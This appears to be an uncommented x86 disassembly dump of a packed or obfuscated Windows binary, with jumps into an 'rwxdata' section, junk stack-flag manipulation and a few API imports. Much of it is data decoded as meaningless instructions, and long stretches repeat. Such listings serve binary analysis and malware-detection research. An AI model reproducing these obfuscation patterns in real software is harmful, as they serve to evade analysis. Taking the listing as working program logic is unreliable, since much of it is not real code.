sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515597
shr ecx 0x1
rol di 0xc
xor bx 0xae85
xadd di bx
mov edi [ esi ]
neg bh
sub bl al
add edi [ ebp - 0x4 ]
add bx di
bsf bx ax
inc bx
shl bh 0x4
add esi 0x8
sub bl dh
clc
shl bh 0x6
bswap bx
mov bx [ esi ]
jmp sub_4ba263
sub_5155f2
[ edi ] [ esi ]
not si
pushfd
movzx esi al
jmp rwxdata
mov esi [ esp + 0x30 ]
mov [ esp ] dl
mov [ esp ] cl
pushfd
pushfd
lea esp [ esp + 0x3c ]
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
